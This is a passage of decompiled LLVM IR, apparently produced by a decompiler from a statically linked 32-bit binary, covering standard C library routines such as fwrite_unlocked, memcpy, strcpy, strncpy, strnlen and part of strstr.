  uselistorder i32 %v1_8052fd1, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8052fd1, { 2, 1, 0 }
  uselistorder i32 %v1_8052fc9, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_8052faf, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8052f85, { 0, 2, 1 }
  uselistorder i32 %v0_8052f72, { 2, 0, 1 }
  uselistorder i32 %v4_8052f0c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134594891, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805c155.496 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80532d0, { 1, 0 }
  uselistorder label %dec_label_pc_80532cd, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_80532c1, { 1, 0 }
  uselistorder label %dec_label_pc_8053296, { 1, 0 }
  uselistorder label %dec_label_pc_805325b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80531ff, { 1, 0 }
  uselistorder label %dec_label_pc_80531d3, { 1, 0 }
  uselistorder label %dec_label_pc_805313b, { 1, 0 }
  uselistorder label %dec_label_pc_8053107, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80530de, { 1, 0 }
  uselistorder label %dec_label_pc_80530b5, { 1, 0 }
  uselistorder label %dec_label_pc_805307c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805301f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052fd9, { 1, 0 }
  uselistorder label %dec_label_pc_8052fd8, { 1, 0 }
  uselistorder label %dec_label_pc_8052fbf, { 1, 0 }
  uselistorder label %dec_label_pc_8052fa8, { 1, 0 }
  uselistorder label %dec_label_pc_8052fa8.outer, { 2, 0, 1 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80532d8 = load i32, i32* @esi, align 4
  %v0_80532d9 = load i32, i32* @ebx, align 4
  store i32 %v0_80532d9, i32* %stack_var_-8, align 4
  %v4_80532dd = ptrtoint i8* %tmp3 to i32
  store i32 %v4_80532dd, i32* @ebx, align 4
  %v3_80532e2 = call i32 @strlen(i8* %tmp3)
  store i32 %v3_80532e2, i32* @esi, align 4
  %v0_80532f3 = load i32, i32* @ebx, align 4
  %v6_80532f4 = call i32 @__GI_fwrite_unlocked(i32 %v0_80532f3, i64 1, i32 %v3_80532e2, i32 %tmp)
  %v1_80532fe = load i32, i32* @esi, align 4
  %v12_80532fe = icmp eq i32 %v6_80532f4, %v1_80532fe
  %v3_8053300 = select i1 %v12_80532fe, i32 %v6_80532f4, i32 -1
  %v2_8053306 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053306, i32* @ebx, align 4
  store i32 %v0_80532d8, i32* @esi, align 4
  ret i32 %v3_8053300

; uselistorder directives
  uselistorder i32 %v6_80532f4, { 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805330c = load i32, i32* @edi, align 4
  %v0_805330d = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8053313 = trunc i64 %arg2 to i32
  store i32 %v4_8053313, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805331b = inttoptr i32 %arg4 to i16*
  %v2_805331b = load i16, i16* %v1_805331b, align 2
  %v1_805331e = and i16 %v2_805331b, 192
  %v6_8053323 = icmp eq i16 %v1_805331e, 192
  br i1 %v6_8053323, label %dec_label_pc_805333e, label %dec_label_pc_805332a

dec_label_pc_805332a:                             ; preds = %entry
  %v0_805332a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_8053332 = call i32 @__stdio_trans2w_o(i16* %v1_805331b, i32 128, i32 %v0_805332a, i32 %v0_805332a)
  %v1_805333a = icmp eq i32 %v6_8053332, 0
  %v1_805333c = icmp eq i1 %v1_805333a, false
  br i1 %v1_805333c, label %dec_label_pc_805337e, label %dec_label_pc_805333e

dec_label_pc_805333e:                             ; preds = %dec_label_pc_805332a, %entry
  %v2_805333e = icmp eq i32 %v4_8053313, 0
  br i1 %v2_805333e, label %dec_label_pc_805337e, label %dec_label_pc_8053342

dec_label_pc_8053342:                             ; preds = %dec_label_pc_805333e
  %v1_8053342 = icmp eq i32 %arg3, 0
  br i1 %v1_8053342, label %dec_label_pc_805337e, label %dec_label_pc_8053346

dec_label_pc_8053346:                             ; preds = %dec_label_pc_8053342
  %v9_805334b = udiv i64 4294967295, %arg2
  %v10_805334b = trunc i64 %v9_805334b to i32
  %v6_805334f = icmp ult i32 %v10_805334b, %arg3
  br i1 %v6_805334f, label %dec_label_pc_805336b, label %dec_label_pc_8053351

dec_label_pc_8053351:                             ; preds = %dec_label_pc_8053346
  %sext = mul i64 %arg2, 4294967296
  %v2_8053354 = sdiv i64 %sext, 4294967296
  %v3_8053354 = sext i32 %arg3 to i64
  %v4_8053354 = mul nsw i64 %v3_8053354, %v2_8053354
  %v5_8053354 = trunc i64 %v4_8053354 to i32
  %v0_8053357 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805335d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8053354, i32 %v0_8053357, i32 %v10_805334b)
  %v6_805335d = sext i32 %v5_805335d to i64
  %v10_8053367 = udiv i64 %v6_805335d, %arg2
  %v11_8053367 = trunc i64 %v10_8053367 to i32
  br label %dec_label_pc_8053380

dec_label_pc_805336b:                             ; preds = %dec_label_pc_8053346
  %v0_805336b = load i32, i32* @ebx, align 4
  %v1_805336b = inttoptr i32 %v0_805336b to i32*
  %v2_805336b = load i32, i32* %v1_805336b, align 4
  %v1_805336d = or i32 %v2_805336b, 8
  %v1_8053370 = trunc i32 %v1_805336d to i16
  %v3_8053370 = inttoptr i32 %v0_805336b to i16*
  store i16 %v1_8053370, i16* %v3_8053370, align 2
  %v0_8053373 = load i32, i32* %stack_var_-28, align 4
  %v1_8053373 = call i32 @__errno_location(i32 %v0_8053373)
  %v1_8053378 = inttoptr i32 %v1_8053373 to i32*
  store i32 22, i32* %v1_8053378, align 4
  br label %dec_label_pc_805337e

dec_label_pc_805337e:                             ; preds = %dec_label_pc_8053342, %dec_label_pc_805333e, %dec_label_pc_805332a, %dec_label_pc_805336b
  br label %dec_label_pc_8053380

dec_label_pc_8053380:                             ; preds = %dec_label_pc_8053351, %dec_label_pc_805337e
  %v0_8053383 = phi i32 [ %v11_8053367, %dec_label_pc_8053351 ], [ 0, %dec_label_pc_805337e ]
  store i32 %v0_805330d, i32* @esi, align 4
  store i32 %v0_805330c, i32* @edi, align 4
  ret i32 %v0_8053383

; uselistorder directives
  uselistorder i32 %v0_805332a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053380, { 1, 0 }
  uselistorder label %dec_label_pc_805337e, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053385 = load i32, i32* @esi, align 4
  store i32 %v0_8053385, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8053386 = sdiv i32 %sext, 16777216
  store i32 %v4_8053386, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805338e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805338e, i32* %edi.global-to-local, align 4
  %v2_8053394 = udiv i32 %v4_8053386, 4
  %v3_8053397 = inttoptr i32 %arg2 to i8*
  %v4_8053397 = bitcast i16* %arg1 to i8*
  %v5_8053397 = call i8* @_memcpy(i8* %v4_8053397, i8* %v3_8053397, i32 %v2_8053394)
  %v6_8053397 = ptrtoint i8* %v5_8053397 to i32
  store i32 %v6_8053397, i32* @ecx, align 4
  %v0_8053399 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053399 = and i32 %v0_8053399, 2
  %v3_8053399 = icmp eq i32 %v2_8053399, 0
  br i1 %v3_8053399, label %dec_label_pc_805339f, label %dec_label_pc_805339d

dec_label_pc_805339d:                             ; preds = %entry
  %v0_805339d = load i32, i32* %esi.global-to-local, align 4
  %v1_805339d = inttoptr i32 %v0_805339d to i16*
  %v2_805339d = load i16, i16* %v1_805339d, align 2
  %v3_805339d = load i32, i32* %edi.global-to-local, align 4
  %v4_805339d = inttoptr i32 %v3_805339d to i16*
  store i16 %v2_805339d, i16* %v4_805339d, align 2
  %v5_805339d = load i32, i32* %edi.global-to-local, align 4
  %v6_805339d = load i32, i32* %esi.global-to-local, align 4
  %v7_805339d = load i1, i1* @df, align 1
  %v8_805339d = select i1 %v7_805339d, i32 -2, i32 2
  %v9_805339d = add i32 %v8_805339d, %v5_805339d
  %v10_805339d = add i32 %v8_805339d, %v6_805339d
  store i32 %v9_805339d, i32* %edi.global-to-local, align 4
  store i32 %v10_805339d, i32* %esi.global-to-local, align 4
  %v0_805339f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805339f

dec_label_pc_805339f:                             ; preds = %entry, %dec_label_pc_805339d
  %v0_805339f = phi i32 [ %v0_8053399, %entry ], [ %v0_805339f.pre, %dec_label_pc_805339d ]
  %v2_805339f = urem i32 %v0_805339f, 2
  %v3_805339f = icmp eq i32 %v2_805339f, 0
  br i1 %v3_805339f, label %dec_label_pc_80533a4, label %dec_label_pc_80533a3

dec_label_pc_80533a3:                             ; preds = %dec_label_pc_805339f
  %v0_80533a3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80533a3 = inttoptr i32 %v0_80533a3 to i8*
  %v2_80533a3 = load i8, i8* %v1_80533a3, align 1
  %v3_80533a3 = load i32, i32* %edi.global-to-local, align 4
  %v4_80533a3 = inttoptr i32 %v3_80533a3 to i8*
  store i8 %v2_80533a3, i8* %v4_80533a3, align 1
  %v5_80533a3 = load i32, i32* %edi.global-to-local, align 4
  %v6_80533a3 = load i32, i32* %esi.global-to-local, align 4
  %v7_80533a3 = load i1, i1* @df, align 1
  %v8_80533a3 = select i1 %v7_80533a3, i32 -1, i32 1
  %v9_80533a3 = add i32 %v8_80533a3, %v5_80533a3
  %v10_80533a3 = add i32 %v8_80533a3, %v6_80533a3
  store i32 %v9_80533a3, i32* %edi.global-to-local, align 4
  store i32 %v10_80533a3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80533a4

dec_label_pc_80533a4:                             ; preds = %dec_label_pc_805339f, %dec_label_pc_80533a3
  store i32 %v4_805338e, i32* %eax.global-to-local, align 4
  %v2_80533a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80533a8, i32* @esi, align 4
  ret i32 %v4_805338e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_80533a4, { 1, 0 }
  uselistorder label %dec_label_pc_805339f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80533ac = load i32, i32* @edi, align 4
  %v4_80533b5 = ptrtoint i8* %arg1 to i32
  %v5_80533b9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_80533b9 = ptrtoint i8* %v5_80533b9 to i32
  store i32 %v6_80533b9, i32* @ecx, align 4
  store i32 %v0_80533ac, i32* @edi, align 4
  ret i32 %v4_80533b5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80533c5 = ptrtoint i8* %arg1 to i32
  %v2_80533cd = mul i32 %arg2, 256
  %v3_80533cd = and i32 %v2_80533cd, 65280
  %v4_80533cd = and i32 %arg2, -65281
  %v5_80533cd = or i32 %v3_80533cd, %v4_80533cd
  %v8_80533cf.pre = load i1, i1* @df, align 1
  %v9_80533cf = select i1 %v8_80533cf.pre, i32 -1, i32 1
  br label %dec_label_pc_80533cf

dec_label_pc_80533cf:                             ; preds = %dec_label_pc_80533d4, %entry
  %v4_80533cf = phi i32 [ %v6_80533cf, %dec_label_pc_80533d4 ], [ %v5_80533cd, %entry ]
  %v7_80533cf = phi i32 [ %v10_80533cf, %dec_label_pc_80533d4 ], [ %v4_80533c5, %entry ]
  %v1_80533cf = inttoptr i32 %v7_80533cf to i8*
  %v2_80533cf = load i8, i8* %v1_80533cf, align 1
  %v10_80533cf = add i32 %v7_80533cf, %v9_80533cf
  %v3_80533d0 = udiv i32 %v4_80533cf, 256
  %v4_80533d0 = trunc i32 %v3_80533d0 to i8
  %v16_80533d0 = icmp eq i8 %v2_80533cf, %v4_80533d0
  br i1 %v16_80533d0, label %dec_label_pc_80533dd, label %dec_label_pc_80533d4

dec_label_pc_80533d4:                             ; preds = %dec_label_pc_80533cf
  %v3_80533cf = zext i8 %v2_80533cf to i32
  %v5_80533cf = and i32 %v4_80533cf, -256
  %v6_80533cf = or i32 %v3_80533cf, %v5_80533cf
  %v4_80533d4 = icmp eq i8 %v2_80533cf, 0
  %v1_80533d6 = icmp eq i1 %v4_80533d4, false
  br i1 %v1_80533d6, label %dec_label_pc_80533cf, label %dec_label_pc_80533d8

dec_label_pc_80533d8:                             ; preds = %dec_label_pc_80533d4
  br label %dec_label_pc_80533dd

dec_label_pc_80533dd:                             ; preds = %dec_label_pc_80533cf, %dec_label_pc_80533d8
  %v0_80533dd = phi i32 [ 1, %dec_label_pc_80533d8 ], [ %v10_80533cf, %dec_label_pc_80533cf ]
  %v1_80533df = add i32 %v0_80533dd, -1
  ret i32 %v1_80533df

; uselistorder directives
  uselistorder i8 %v2_80533cf, { 1, 2, 0 }
  uselistorder i32 %v4_80533cf, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80533dd, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80533e5 = load i32, i32* @esi, align 4
  store i32 %v0_80533e5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80533ed = ptrtoint i8* %arg1 to i32
  store i32 %v4_80533ed, i32* %edi.global-to-local, align 4
  %v4_80533f1.pre = load i32, i32* @eax, align 4
  %v8_80533f1.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80533f1

dec_label_pc_80533f1:                             ; preds = %dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge, %entry
  %v2_80533f2 = phi i32 [ %v7_80533f2, %dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge ], [ %v4_80533ed, %entry ]
  %v8_80533f1 = phi i1 [ %v5_80533f2, %dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge ], [ %v8_80533f1.pre, %entry ]
  %v4_80533f1 = phi i32 [ %v0_80533f3, %dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge ], [ %v4_80533f1.pre, %entry ]
  %v7_80533f1 = phi i32 [ %v0_80533f1.pre, %dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge ], [ %arg2, %entry ]
  %v1_80533f1 = inttoptr i32 %v7_80533f1 to i8*
  %v2_80533f1 = load i8, i8* %v1_80533f1, align 1
  %v3_80533f1 = zext i8 %v2_80533f1 to i32
  %v5_80533f1 = and i32 %v4_80533f1, -256
  %v6_80533f1 = or i32 %v3_80533f1, %v5_80533f1
  store i32 %v6_80533f1, i32* %eax.global-to-local, align 4
  %v9_80533f1 = select i1 %v8_80533f1, i32 -1, i32 1
  %v10_80533f1 = add i32 %v7_80533f1, %v9_80533f1
  store i32 %v10_80533f1, i32* %esi.global-to-local, align 4
  %v3_80533f2 = inttoptr i32 %v2_80533f2 to i8*
  store i8 %v2_80533f1, i8* %v3_80533f2, align 1
  %v4_80533f2 = load i32, i32* %edi.global-to-local, align 4
  %v5_80533f2 = load i1, i1* @df, align 1
  %v6_80533f2 = select i1 %v5_80533f2, i32 -1, i32 1
  %v7_80533f2 = add i32 %v6_80533f2, %v4_80533f2
  store i32 %v7_80533f2, i32* %edi.global-to-local, align 4
  %v0_80533f3 = load i32, i32* %eax.global-to-local, align 4
  %v3_80533f3 = trunc i32 %v0_80533f3 to i8
  %v4_80533f3 = icmp eq i8 %v3_80533f3, 0
  %v1_80533f5 = icmp eq i1 %v4_80533f3, false
  br i1 %v1_80533f5, label %dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge, label %dec_label_pc_80533f7

dec_label_pc_80533f1.dec_label_pc_80533f1_crit_edge: ; preds = %dec_label_pc_80533f1
  %v0_80533f1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80533f1

dec_label_pc_80533f7:                             ; preds = %dec_label_pc_80533f1
  store i32 %v4_80533ed, i32* %eax.global-to-local, align 4
  %v2_80533fb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80533fb, i32* @edx, align 4
  %v2_80533fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80533fc, i32* @esi, align 4
  ret i32 %v4_80533ed

; uselistorder directives
  uselistorder i32 %v0_80533f3, { 1, 0 }
  uselistorder i32 %v7_80533f2, { 1, 0 }
  uselistorder i1 %v5_80533f2, { 1, 0 }
  uselistorder i32 %v4_80533ed, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053415 = load i32, i32* @esi, align 4
  store i32 %v0_8053415, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8053421 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053421, i32* %edi.global-to-local, align 4
  %v1_8053425 = add i32 %arg3, 1
  store i32 %v1_8053425, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053426

dec_label_pc_8053426:                             ; preds = %dec_label_pc_8053429, %entry
  %v3_805342a = phi i32 [ %v4_8053421, %entry ], [ %v8_805342a, %dec_label_pc_8053429 ]
  %v0_8053426 = phi i32 [ %v1_8053425, %entry ], [ %v0_8053426.pre, %dec_label_pc_8053429 ]
  %v1_8053426 = add i32 %v0_8053426, -1
  %v8_8053426 = icmp eq i32 %v1_8053426, 0
  store i32 %v1_8053426, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053426, label %.loopexit, label %dec_label_pc_8053429

dec_label_pc_8053429:                             ; preds = %dec_label_pc_8053426
  %v0_8053429 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053429 = inttoptr i32 %v0_8053429 to i8*
  %v2_8053429 = load i8, i8* %v1_8053429, align 1
  %v10_8053429 = load i1, i1* @df, align 1
  %v11_8053429 = select i1 %v10_8053429, i32 -1, i32 1
  %v12_8053429 = add i32 %v11_8053429, %v0_8053429
  store i32 %v12_8053429, i32* %esi.global-to-local, align 4
  %v4_805342a = inttoptr i32 %v3_805342a to i8*
  store i8 %v2_8053429, i8* %v4_805342a, align 1
  %v5_805342a = load i32, i32* %edi.global-to-local, align 4
  %v6_805342a = load i1, i1* @df, align 1
  %v7_805342a = select i1 %v6_805342a, i32 -1, i32 1
  %v8_805342a = add i32 %v7_805342a, %v5_805342a
  store i32 %v8_805342a, i32* %edi.global-to-local, align 4
  %v6_805342b = icmp eq i8 %v2_8053429, 0
  %v1_805342d = icmp eq i1 %v6_805342b, false
  %v0_8053426.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_805342d, label %dec_label_pc_8053426, label %dec_label_pc_805342f

dec_label_pc_805342f:                             ; preds = %dec_label_pc_8053429
  %v1_805342f = add i32 %v0_8053426.pre, -1
  store i32 %v1_805342f, i32* %ecx.global-to-local, align 4
  %v2_8053430 = sext i8 %v2_8053429 to i32
  %v4_8053430 = inttoptr i32 %v8_805342a to i8*
  %v5_8053430 = call i8* @_memset(i8* %v4_8053430, i32 %v2_8053430, i32 %v1_805342f)
  %v6_8053430 = ptrtoint i8* %v5_8053430 to i32
  store i32 %v6_8053430, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8053426, %dec_label_pc_805342f
  %v2_8053436 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053436, i32* @edx, align 4
  %v2_8053437 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053437, i32* @esi, align 4
  ret i32 %v4_8053421

; uselistorder directives
  uselistorder i32 %v8_805342a, { 0, 2, 1 }
  uselistorder i8 %v2_8053429, { 0, 2, 1 }
  uselistorder i32 %v1_8053426, { 1, 0 }
  uselistorder i32 %v4_8053421, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_805343c = ptrtoint i8* %tmp4 to i32
  %v8_805344f8 = icmp eq i32 %tmp, 0
  %v1_805345010 = icmp eq i1 %v8_805344f8, false
  br i1 %v1_805345010, label %dec_label_pc_8053449, label %dec_label_pc_8053452

dec_label_pc_8053449:                             ; preds = %entry, %dec_label_pc_805344e
  %v1_805344f12 = phi i32 [ %v1_805344f, %dec_label_pc_805344e ], [ %tmp, %entry ]
  %v0_805345211 = phi i32 [ %v1_805344e, %dec_label_pc_805344e ], [ %v4_805343c, %entry ]
  %v1_8053449 = inttoptr i32 %v0_805345211 to i8*
  %v2_8053449 = load i8, i8* %v1_8053449, align 1
  %v3_8053449 = icmp eq i8 %v2_8053449, 0
  br i1 %v3_8053449, label %dec_label_pc_8053452, label %dec_label_pc_805344e

dec_label_pc_805344e:                             ; preds = %dec_label_pc_8053449
  %v1_805344e = add i32 %v0_805345211, 1
  %v1_805344f = add i32 %v1_805344f12, -1
  %v8_805344f = icmp eq i32 %v1_805344f, 0
  %v1_8053450 = icmp eq i1 %v8_805344f, false
  br i1 %v1_8053450, label %dec_label_pc_8053449, label %dec_label_pc_8053452

dec_label_pc_8053452:                             ; preds = %dec_label_pc_805344e, %dec_label_pc_8053449, %entry
  %v0_8053452.lcssa = phi i32 [ %v4_805343c, %entry ], [ %v0_805345211, %dec_label_pc_8053449 ], [ %v1_805344e, %dec_label_pc_805344e ]
  %v2_8053452 = sub i32 %v0_8053452.lcssa, %v4_805343c
  ret i32 %v2_8053452

; uselistorder directives
  uselistorder i32 %v1_805344f, { 1, 0 }
  uselistorder i32 %v0_805345211, { 0, 2, 1 }
  uselistorder i32 %v4_805343c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053449, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_805345b = load i32, i32* @ebx, align 4
  %v4_805345f = ptrtoint i8* %arg2 to i32
  %v2_8053467 = load i8, i8* %arg2, align 1
  %v1_805346a = icmp eq i8 %v2_8053467, 0
  br i1 %v1_805346a, label %dec_label_pc_805351e, label %dec_label_pc_8053475

dec_label_pc_8053475:                             ; preds = %entry
  %v1_8053475 = add i32 %arg1, -1
  br label %dec_label_pc_8053476

dec_label_pc_8053476:                             ; preds = %dec_label_pc_8053482, %dec_label_pc_8053475
  %v0_8053476 = phi i32 [ %v1_8053476, %dec_label_pc_8053482 ], [ %v1_8053475, %dec_label_pc_8053475 ]
  %v1_8053476 = add i32 %v0_8053476, 1
  %v1_8053477 = inttoptr i32 %v1_8053476 to i8*
  %v2_8053477 = load i8, i8* %v1_8053477, align 1
  %v1_805347a = icmp eq i8 %v2_8053477, 0
  br i1 %v1_805347a, label %dec_label_pc_805351c, label %dec_label_pc_8053482

dec_label_pc_8053482:                             ; preds = %dec_label_pc_8053476
  %v14_8053482 = icmp eq i8 %v2_8053477, %v2_8053467
  %v1_8053485 = icmp eq i1 %v14_8053482, false
  br i1 %v1_8053485, label %dec_label_pc_8053476, label %dec_label_pc_8053487

dec_label_pc_8053487:                             ; preds = %dec_label_pc_8053482
  %v1_8053487 = add i32 %v4_805345f, 1
  %v2_805348e = inttoptr i32 %v1_8053487 to i8*
  %v3_805348e = load i8, i8* %v2_805348e, align 1
  %v1_8053492 = icmp eq i8 %v3_805348e, 0
  br i1 %v1_8053492, label %dec_label_pc_805351e, label %dec_label_pc_805349a

dec_label_pc_805349a:                             ; preds = %dec_label_pc_8053487
  %v1_805349a = add i32 %v0_8053476, 2
  %v1_80534e4 = add i32 %v4_805345f, 2
  %v2_80534e4 = inttoptr i32 %v1_80534e4 to i8*
  br label %dec_label_pc_80534d0

dec_label_pc_80534a5:                             ; preds = %dec_label_pc_8053514
  %v2_80534a5 = inttoptr i32 %v0_80534d6 to i8*
  %v3_80534a5 = load i8, i8* %v2_80534a5, align 1
  br label %dec_label_pc_80534c3.preheader

dec_label_pc_80534c3.preheader:                   ; preds = %dec_label_pc_80534a5, %dec_label_pc_80534d0
  %v0_80534ae.ph.in = phi i8 [ %v4_805349a.sink.in, %dec_label_pc_80534d0 ], [ %v3_80534a5, %dec_label_pc_80534a5 ]
  %v14_80534c345 = icmp eq i8 %v0_80534ae.ph.in, %v2_8053467
  %v1_80534c647 = icmp eq i1 %v14_80534c345, false
  br i1 %v1_80534c647, label %dec_label_pc_80534ae, label %dec_label_pc_80534c8

dec_label_pc_80534ae:                             ; preds = %dec_label_pc_80534c3.preheader, %dec_label_pc_80534bf
  %v0_80534ae49.in = phi i8 [ %v2_80534c0, %dec_label_pc_80534bf ], [ %v0_80534ae.ph.in, %dec_label_pc_80534c3.preheader ]
  %v0_80534b248 = phi i32 [ %v1_80534bf, %dec_label_pc_80534bf ], [ %v0_80534d6, %dec_label_pc_80534c3.preheader ]
  %v1_80534ae = icmp eq i8 %v0_80534ae49.in, 0
  br i1 %v1_80534ae, label %dec_label_pc_805351c, label %dec_label_pc_80534b2

dec_label_pc_80534b2:                             ; preds = %dec_label_pc_80534ae
  %v1_80534b2 = add i32 %v0_80534b248, 1
  %v1_80534b3 = inttoptr i32 %v1_80534b2 to i8*
  %v2_80534b3 = load i8, i8* %v1_80534b3, align 1
  %v14_80534b6 = icmp eq i8 %v2_80534b3, %v2_8053467
  br i1 %v14_80534b6, label %dec_label_pc_80534c8, label %dec_label_pc_80534bb

dec_label_pc_80534bb:                             ; preds = %dec_label_pc_80534b2
  %v1_80534bb = icmp eq i8 %v2_80534b3, 0
  br i1 %v1_80534bb, label %dec_label_pc_805351c, label %dec_label_pc_80534bf

dec_label_pc_80534bf:                             ; preds = %dec_label_pc_80534bb
  %v1_80534bf = add i32 %v0_80534b248, 2
  %v1_80534c0 = inttoptr i32 %v1_80534bf to i8*
  %v2_80534c0 = load i8, i8* %v1_80534c0, align 1
  %v14_80534c3 = icmp eq i8 %v2_80534c0, %v2_8053467
  %v1_80534c6 = icmp eq i1 %v14_80534c3, false
  br i1 %v1_80534c6, label %dec_label_pc_80534ae, label %dec_label_pc_80534c8

dec_label_pc_80534c8:                             ; preds = %dec_label_pc_80534bf, %dec_label_pc_80534b2, %dec_label_pc_80534c3.preheader
  %v0_80534c8 = phi i32 [ %v0_80534d6, %dec_label_pc_80534c3.preheader ], [ %v1_80534b2, %dec_label_pc_80534b2 ], [ %v1_80534bf, %dec_label_pc_80534bf ]
  %v1_80534c8 = add i32 %v0_80534c8, 1
  br label %dec_label_pc_80534d0

